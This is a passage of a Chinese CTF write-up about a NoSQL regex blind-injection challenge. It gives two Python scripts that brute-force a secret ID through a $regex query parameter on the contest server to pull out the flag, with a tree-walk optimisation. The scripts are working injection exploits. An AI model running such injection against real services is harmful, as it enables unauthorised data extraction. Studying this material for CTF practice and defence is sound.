<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;requests<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;re<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">class&nbsp;<span style="line-height: 26px;">Outloop</span>(Exception):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">pass</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">try</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">for</span>&nbsp;i&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;0123456789abcdef&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">for</span>&nbsp;j&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;123456789abcdef0&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">for</span>&nbsp;k&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;23456789abcdef01&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^.{}{}{}&quot;</span>.format(i,&nbsp;j,&nbsp;k)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;[i]&nbsp;Still&nbsp;looking&nbsp;for:&nbsp;&quot;</span>+i+j+k)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;requests.request(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;GET&quot;</span>,&nbsp;url)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;CSR&quot;</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;response.text:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;[+]&nbsp;Flag:&nbsp;CSR&quot;</span>+re.search(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">r&quot;CSR(.*)}&quot;</span>,response.text)[<span style="box-sizing: border-box;color: #008080;line-height: 26px;">1</span>]+<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;}&quot;</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">raise</span>&nbsp;Outloop()<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">except</span>&nbsp;Outloop:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">pass</span><br style="box-sizing: border-box;"/></code></pre>
<p><br/></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395271.png"/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">发 200+ 次请求得到了 flag 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">国外师傅</span><span style="font-size: 15px;">有给出优化版本的，是把哈希值视为了树结构，从根节点开始（设置 0~f 中的任意值），先判断其是否有子节点，如果有，是否有多个，优化规则如下：</span></p>
<blockquote style="box-sizing: border-box;margin-top: 20px;margin-bottom: 20px;border-top: none;border-right: none;border-bottom: none;border-left-color: rgba(0, 0, 0, 0.4);font-size: 0.9em;overflow: auto;background: rgba(0, 0, 0, 0.05);color: rgb(106, 115, 125);padding: 10px 10px 10px 20px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;"><p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">如果一个节点只有一个子节点，我们假设它只会产生一个散列，因此我们不会遍历子节点的路径。</span></p>
</blockquote>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">也就是假设 payload 为&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">?secid[$regex]=^73</span></code><span style="font-size: 15px;">&nbsp;没有子节点，那么当然我们遍历第三层时，就不会再去遍历 730，731，...，73f 等；而如果 78c 有一个子节点 78c1 ，也认为其只会产生一个散列 78c1 ，如图（图源自国外师傅 wp）：</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-16073952711.png"/></p>
<p><br/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">可以想到，我们上面写的脚本其实是所有节点不管有没有子节点都去遍历了一遍，所以非常耗时间。</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#!/usr/bin/env</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;requests&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">as</span>&nbsp;req<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;time<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;re<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;queue<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;hashlib<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>URL&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^&quot;</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;查找&nbsp;flag&nbsp;的正则表达式</span><br style="box-sizing: border-box;"/>regex&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">r&quot;--&gt;(.*)&lt;!--&quot;</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>deadStarts&nbsp;=&nbsp;[]<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>chars&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;0123456789abcdef&quot;</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;如果父节点有多个子节点</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">parentHasMoreThanOneChildren</span>(hash):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;len(hash)&nbsp;-&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">1</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;l&nbsp;&lt;&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">0</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">True</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;URL&nbsp;+&nbsp;hash[:l]&nbsp;+&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;[^&#39;</span>&nbsp;+&nbsp;hash[l]&nbsp;+&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;]&#39;</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;req.get(&nbsp;url&nbsp;)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;r.status_code&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">404</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">False</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">True</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;是否有子节点</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">hasChild</span>(hash):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;URL&nbsp;+&nbsp;hash<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;req.get(&nbsp;url&nbsp;)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;r.status_code&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">404</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">False</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">True</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;获取&nbsp;secret</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">getSecret</span>(hash):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;URL&nbsp;+&nbsp;hash<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;req.get(&nbsp;url&nbsp;)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;re.search(regex,&nbsp;r.text)[<span style="box-sizing: border-box;color: #008080;line-height: 26px;">1</span>]<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;访问子节点判断是否有&nbsp;flag</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">visitChild</span>(hash):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;print(hash,&nbsp;end=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&nbsp;&#39;</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">not</span>&nbsp;parentHasMoreThanOneChildren(hash):<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secret&nbsp;=&nbsp;getSecret(hash)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&nbsp;secret&nbsp;)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;csr&quot;</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;secret.lower():<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit()<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;print(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&#39;</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">for</span>&nbsp;c&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;chars:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;hasChild(&nbsp;hash&nbsp;+&nbsp;c&nbsp;):<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;visitChild(&nbsp;hash&nbsp;+c&nbsp;)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;这里设置的根节点为&nbsp;6</span><br style="box-sizing: border-box;"/>visitChild(&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;6&#39;</span>&nbsp;)<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">实际上确实是很快。</span></p>
<h1 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 24px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="background-color: #3DAAD6;color: #FFFFFF;"><strong><span style="color: #FFFFFF;background-color: #3DAAD6;box-sizing: border-box;font-size: 15px;">0x03 后记</span></strong></span></h1>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">这次比赛打完复盘收获不少，相比于一些比赛总是模改题还是非常不错的，也感觉到自己开发经验欠缺，比如 node 只在原型链污染有接触过一点点，但却没有深入，还是要继续努力</span></p>
<section style="max-width: 100%;box-sizing: border-box;overflow-wrap: break-word;font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-variant-numeric: normal;font-variant-east-asian: normal;white-space: normal;background-color: rgb(255, 255, 255);text-align: left;letter-spacing: 0.54px;">
<section style="max-width: 100%;box-sizing: border-box;overflow-wrap: break-word;width: 677px;">
<section style="max-width: 100%;box-sizing: border-box;overflow-wrap: break-word;width: 100px;">
<section style="max-width: 100%;box-sizing: border-box;overflow-wrap: break-word;width: 100px;"></section>
</section>
</section>
</section>
				                              <p><span style="color: #00B050;"><strong>本文作者：<a target="_blank" style="color: #00B050;" href="https://www.secpulse.com/archives/newpage/author?author_id=37244">合天网安实验室</a></strong></span></p>



                <p><span style="color: #00B050;"><strong>本文为安全脉搏专栏作者发布，转载请注明：</strong></span><a href="148890.html" target="_blank" style="color: rgb(0, 176, 80); text-decoration: underline;"><span style="color: #00B050;"><strong>https://www.secpulse.com/archives/148890.html</strong></span></a></p>
        </div>
  			<!-- 分享 -->
  			<div style="margin-top:30px;">
  				<span class="tags">Tags: <a href="https://www.secpulse.com/archives/tag/cat" rel="tag">cat</a>、<a href="https://www.secpulse.com/archives/tag/csr" rel="tag">CSR</a>、<a href="https://www.secpulse.com/archives/tag/csregex" rel="tag">CSRegex</a>、<a href="https://www.secpulse.com/archives/tag/ctf" rel="tag">ctf</a>、<a href="https://www.secpulse.com/archives/tag/cyberwall" rel="tag">Cyberwall</a>、<a href="https://www.secpulse.com/archives/tag/dockerfile" rel="tag">dockerfile</a>、<a href="https://www.secpulse.com/archives/tag/flask-%e6%a1%86%e6%9e%b6" rel="tag">flask 框架</a>、<a href="https://www.secpulse.com/archives/tag/node-js-rce" rel="tag">Node.JS RCE</a>、<a href="https://www.secpulse.com/archives/tag/nosql-%e7%9b%b2%e6%b3%a8" rel="tag">NoSQL 盲注</a>、<a href="https://www.secpulse.com/archives/tag/python-yaml-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" rel="tag">Python yaml 反序列化</a>、<a href="https://www.secpulse.com/archives/tag/web-2" rel="tag">Web</a>、<a href="https://www.secpulse.com/archives/tag/%E7%9B%B2%E6%B3%A8" rel="tag">盲注</a></span>  			</div>
                            
        <div class="left-9-icon defaultcolor clearfix">
            <div class="icon-left fl">
                  <a href="javascript:void(0)"  class="specsZan " data-action="ding" data-id="148890" ><i class="iconfont icon-zan"></i>点赞：
                      0                  </a>
                  <a href="#goComment"><i class="iconfont iconfont icon-pinglun"></i>评论：0 </a>

                 
                  <a href="javascript:void(0)"  onclick="collectionNew(this,'148890')">
                    <i class="iconfont iconfont icon-shoucang1"></i>收藏：
                    0                  </a>
            </div>
            <div class="icon-right fr">
                                    <a href="javascript:void(0)" title="积分仅作为该文章的含金量参考" style="cursor:text;"><i class="iconfont icon-jifen"></i>&nbsp;积分&nbsp;20</a>
                   
                                <i class="iconfont icon-fenxiang1 mr20 pointer" style="position:relative;">
                    <div class="shareMenu">
                        <a href="javascript:void(0)" target="_blank" id="share_sina" class="Button Menu-item ShareMenu-button Button--plain"><i class="iconfont icon-weibo"></i>新浪微博</a>
                        <a href="javascript:void(0)" target="_blank" title="分享到QQ空间" id="share_qqzone"><i class="iconfont icon-QQkongjian"></i>QQ空间</a>
                        <a href="javascript:void(0)" class="Button Menu-item ShareMenu-button Button--plain"><i class="iconfont icon-weixin"></i>微信扫一扫</a>
                        <!-- <img src="" id="weichar_img" width="70%" style="margin-left:8%;"/> -->
                    </div>
                </i>
            </div>
        </div>
      		<!-- .single-content -->
      </div>
		  <!-- 相关文章 -->
  		<section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/197505.html" title="详细阅读 CTF中RSA常见攻击方法"><img width="300" height="205" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/1678785929506-300x205.png" class="attachment-medium wp-post-image" alt="CTF中RSA常见攻击方法" /><p>CTF中RSA常见攻击方法</P></a></li>
				<li><a href="https://www.secpulse.com/archives/197285.html" title="详细阅读 探究SMC局部代码加密技术以及在CTF中的运用"><img width="300" height="190" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/1678429569077-300x190.png" class="attachment-medium wp-post-image" alt="探究SMC局部代码加密技术以及在CTF中的运用" /><p>探究SMC局部代码加密技术以及在CTF中&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/196849.html" title="详细阅读 CTF中的神兵利刃-foremost工具之文件分离"><img width="300" height="156" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/%E5%9B%BE%E7%89%87111-300x156.png" class="attachment-medium wp-post-image" alt="CTF中的神兵利刃-foremost工具之文件分离" /><p>CTF中的神兵利刃-foremost工具&hellip;</P></a></li>
			</ul>


</section>			
  		

<div class="comment" id="goComment">
    <div class="comment-icon blue">
        <i class="iconfont icon-pinglun111"></i>
        <span class="comment-num">评论&nbsp;&nbsp;(<span id="commentNum">0</span>)</span>
    </div>
            <div class="comment-author-info">
            <div class="login-input">
                <p>
                    <label for="author">昵称</label>
                    <input type="text" name="author" id="author_input" value="" size="14" tabindex="1" aria-required="true" placeholder="请输入昵称" required="">
                </p>
                <span>必填</span>
                <span>您当前尚未登录。
        		<a class="simplemodal-login" href="https://www.secpulse.com/user_login" title="登录">登录？</a>
        		<a href="https://www.secpulse.com/user-register">注册</a>
        	</span>
            </div>
            <div class="login-input">
                <p>
                    <label for="email">邮箱</label>
                    <input type="text" name="email" id="email_input" value="" size="25" tabindex="2" aria-required="true" placeholder="请输入邮箱地址" required="">
                </p>
                <span>必填（保密）</span>
            </div>
        </div>
        <div class="input-text blue">快来写下你的想法吧！</div>
    <div class="wrap-textarea">
        <textarea name="express" id="express" placeholder="快来写下你的想法吧！" autoHeight="true" ></textarea>
        <div class="tijiao clearfix blue">
            <div class="tijiao-left fl">
                <span id="face_show" class="iconfont icon-btn_xiaolian pointer"></span>
                <span class="iconfont icon-xiangji pointer" onclick="uploadImg(this)" style="font-size:24px;"></span>
            </div>
            <input type="button" id="huifu" type_btn="parent" class="fr pointer" value="发表">
        </div>
    </div>
    <div style="display:none;height:200px" class="qqFace_wrp"></div>
        <input type="hidden" id="now_page" value="" />
    <input type="hidden" id="nest_page" value="">
    <input type="hidden" id="base_url" value="https://www.secpulse.com/wp-content/themes/secpulse2017" />
    <input id="home_url" type="hidden" value="https://www.secpulse.com/wp-admin/admin-ajax.php">
    <div class="comment-real">
        <ul class="first">
                    </ul>
            </div>
    <form id="comment_form" action="https://www.secpulse.com/wp-comments-post.php">
        <input name="comment" type="hidden" id="comment_content" value="" />
        <input name="email" type="hidden" id="email_content" value="" />
        <input name="author" type="hidden" id="author_content" value="" />
        <input type='hidden' name='comment_post_ID' value='148890' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="70246684f0" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="22"/></p>    </form>
</div>

<!-- uploadimage -->
<form id="uploadForm" enctype="multipart/form-data" style="display: none;">
    <input id="comment_file" type="file" name="file"/>
    <button id="upload" type="button">upload</button>
</form>

<script>
    //分页
    function comment_page(obj){
        var page_url = $("#nest_page").val();
        var page_count = 0;
        now_count = $("#now_page").val();
        $(obj).html('加载中<i class="iconfont icon-xia"></i>');
        if(now_count < (page_count)){
            $.ajax({
                url: page_url,
                type: 'get',
                dataType:'html',
                timeout: 1000,
                success: function (data) {
                    $("#nest_page").val($(data).find('#nest_page').val());
                    $("#now_page").val($(data).find('#now_page').val())
                    if($(data).find(".first").html().length > 10){
                        $(".first").append($(data).find(".first").html().replace(/\[em_([0-9]*)\]/g,'<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/img/face/$1.gif" border="0" />'))
                    }
                    $(obj).html('显示更多<i class="iconfont icon-xia"></i>');

                },error: function(jqXHR, textStatus, errorThrown) {
                    if(jqXHR.status == 404) {
                        $(obj).html('显示更多<i class="iconfont icon-xia"></i>');
                    }
                }
            })
        }else{
            $(obj).html('没了<i class="iconfont icon-xia"></i>');
        }
    }

    $(function(){
        $('.icon-btn_xiaolian').qqFace({
            assign:'express', //给那个控件赋值
